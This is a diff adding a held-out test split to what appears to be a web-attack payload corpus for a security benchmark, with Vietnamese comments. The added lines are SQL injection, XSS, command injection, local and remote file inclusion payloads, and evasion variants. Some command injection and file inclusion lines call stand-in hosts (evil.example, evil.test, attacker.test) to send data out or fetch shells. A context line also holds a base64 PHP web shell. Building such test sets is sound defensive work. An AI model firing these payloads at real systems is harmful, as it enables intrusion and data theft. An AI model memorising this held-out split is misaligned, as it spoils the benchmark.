@@ -236,3 +236,197 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+
 # PayloadsAllTheThings — backslash mixed traversal
 ....\/....\/etc\/passwd
 ..%5c..%5c..%5cetc%5cpasswd
+
+
+# =============================================================================
+# held_out — tập test giữ lại, CHƯA dùng trong bất kỳ lần chạy benchmark nào.
+#
+# Nguồn: v1 payloads gốc (từ build_corpus.py trước refactor, đã bị loại ra khi
+#         chuyển sang data-file) + kỹ thuật bổ sung từ cùng nguồn công khai.
+# Build script đặt split="held_out" cho toàn bộ group này (ngoài dev và test, xếp sau cùng).
+# =============================================================================
+
+## held_out :: sqli   /vulnerabilities/sqli/   param: id
+
+=== sqli-classic ===
+# v1 — PayloadsAllTheThings / PortSwigger (OR-based, không có trong corpus hiện tại)
+1' OR '1'='1
+1' OR 1=1-- -
+
+=== sqli-union-classic ===
+# v1 — PortSwigger SQLi UNION
+1' UNION SELECT user,password FROM users-- -
+
+=== sqli-stacked-classic ===
+# v1 — OWASP SQLi stacked queries
+1'; DROP TABLE users-- -
+
+=== sqli-blind-classic ===
+# v1 — PayloadsAllTheThings time-based blind
+1' AND SLEEP(5)-- -
+
+=== sqli-time-v2 ===
+# new — PayloadsAllTheThings time/benchmark blind
+1' AND (SELECT * FROM (SELECT(SLEEP(3)))x)-- -
+1' AND BENCHMARK(10000000,MD5(1))-- -
+
+=== sqli-union-exfil ===
+# new — PortSwigger data extraction UNION
+1' UNION SELECT NULL,group_concat(username,0x3a,password) FROM users-- -
+1' UNION SELECT table_name,NULL FROM information_schema.tables-- -
+
+# --- evasion-style (WAF bypass / encoding) ---
+
+=== sqli-evade-classic ===
+# v1 — PayloadsAllTheThings comment + case mix (không có trong corpus hiện tại)
+1'/**/OR/**/1=1-- -
+1' UnIoN SeLeCt 1,2-- -
+
+=== sqli-evade-version-comment ===
+# v1 — PayloadsAllTheThings MySQL versioned comment
+1' /*!50000UNION*/ /*!50000SELECT*/ 1,2-- -
+
+=== sqli-evade-url-encoded-classic ===
+# v1 — OWASP URL-encoded SQLi (khác với %09/%0a trong corpus)
+1%27%20OR%201%3D1--%20-
+1%2527%2520OR%25201%253D1
+
+=== sqli-evade-hex-v1 ===
+# v1 — PayloadsAllTheThings hex comparison (khác variant trong corpus)
+1' OR 0x31=0x31-- -
+
+=== sqli-evade-subquery ===
+# new — subquery bypass
+1' OR (SELECT 1)=1-- -
+1'/**/AND/**/1/**/=/**/1-- -
+
+
+## held_out :: xss   /vulnerabilities/xss_r/   param: name
+
+=== xss-classic ===
+# v1 — OWASP / PortSwigger (không có trong corpus hiện tại)
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(document.cookie)>
+javascript:alert(1)
+
+=== xss-uncommon-tags ===
+# new — PortSwigger XSS cheat sheet (ít dùng hơn)
+<marquee onstart=alert(1)>
+<object data=javascript:alert(1)>
+<form><button formaction=javascript:alert(1)>click
+
+=== xss-protocol-tab ===
+# new — OWASP: tab trong javascript: URI
+<a href="jav&#x09;ascript:alert(1)">click
+
+# --- evasion-style ---
+
+=== xss-evade-nested-classic ===
+# v1 — OWASP nested-tag bypass (khác với case-mix trong corpus)
+<scr<script>ipt>alert(1)</scr</script>ipt>
+
+=== xss-evade-url-encoded-classic ===
+# v1 — OWASP single-percent URL-encode (khác %253C double-encode trong corpus)
+%3Cscript%3Ealert(1)%3C/script%3E
+
+=== xss-evade-case-mix-classic ===
+# v1 — PayloadsAllTheThings uppercase attribute
+<IMG SRC=x ONERROR=alert(1)>
+
+=== xss-evade-entity-classic ===
+# v1 — PortSwigger HTML entity in script tag (khác svg onload variant trong corpus)
+<svg><script>&#97;lert(1)</script>
+
+=== xss-evade-js-context ===
+# new — JS context injection (PortSwigger)
+';alert(1)//
+\';alert(1)//
+
+=== xss-evade-data-uri ===
+# new — OWASP data: URI
+<object data="data:text/html,<script>alert(1)</script>">
+
+
+## held_out :: cmdi   /vulnerabilities/exec/ (POST)   param: ip
+
+=== cmdi-classic ===
+# v1 — PayloadsAllTheThings / OWASP (không có trong corpus hiện tại)
+127.0.0.1; cat /etc/passwd
+127.0.0.1 && whoami
+127.0.0.1 | id
+$(curl http://evil.test)
+
+=== cmdi-exfil ===
+# new — PayloadsAllTheThings callback / exfiltration
+127.0.0.1; ping -c 1 evil.example
+127.0.0.1; curl evil.example/$(whoami)
+127.0.0.1; cat /etc/crontab
+
+# --- evasion-style ---
+
+=== cmdi-evade-ifs-classic ===
+# v1 — PayloadsAllTheThings IFS bypass (không có trong corpus hiện tại)
+127.0.0.1;cat${IFS}/etc/passwd
+
+=== cmdi-evade-newline-classic ===
+# v1 — PayloadsAllTheThings newline injection
+127.0.0.1%0acat%20/etc/passwd
+
+=== cmdi-evade-backslash-classic ===
+# v1 — PayloadsAllTheThings backslash evasion (khác c\at variant trong corpus)
+127.0.0.1;c\at /et\c/pa\sswd
+
+=== cmdi-evade-var ===
+# new — variable assignment bypass (PayloadsAllTheThings)
+127.0.0.1;X=cat;$X /etc/passwd
+127.0.0.1;$(printf '\x63\x61\x74') /etc/passwd
+
+
+## held_out :: lfi   /vulnerabilities/fi/   param: page
+
+=== lfi-classic ===
+# v1 — OWASP / PayloadsAllTheThings (không có trong corpus hiện tại)
+../../../../../../etc/passwd
+/etc/passwd
+../../../../etc/shadow
+
+=== lfi-sensitive-system ===
+# new — PayloadsAllTheThings / OWASP WSTG sensitive configs
+../../../../etc/ssh/sshd_config
+/proc/version
+/etc/crontab
+../../../../var/log/apache2/access.log
+
+# --- evasion-style ---
+
+=== lfi-evade-single-url-classic ===
+# v1 — OWASP single-percent URL-encode (khác %252f double-encode trong corpus)
+..%2f..%2f..%2f..%2fetc%2fpasswd
+
+=== lfi-evade-nested-slash-classic ===
+# v1 — PayloadsAllTheThings nested slash bypass (khác ....\/  trong corpus)
+....//....//....//etc/passwd
+
+=== lfi-evade-dot-encode-classic ===
+# v1 — PayloadsAllTheThings encoded dot (khác ..%252f trong corpus)
+%252e%252e%252fetc%252fpasswd
+
+=== lfi-evade-php-filter-classic ===
+# v1 — PayloadsAllTheThings PHP filter wrapper (khác php://input trong corpus)
+php://filter/convert.base64-encode/resource=index
+
+=== lfi-evade-dot-segment ===
+# new — dot segment bypass (PayloadsAllTheThings)
+..././..././etc/passwd
+.%2e/.%2e/etc/passwd
+/etc/./passwd
+
+
+## held_out :: rfi   /vulnerabilities/fi/   param: page
+
+# v1 — OWASP Remote File Inclusion (URL khác với các entry trong corpus)
+http://evil.test/shell.txt
+# new — PayloadsAllTheThings
+http://evil.test/c99.php
+ftp://attacker.test/shell.php
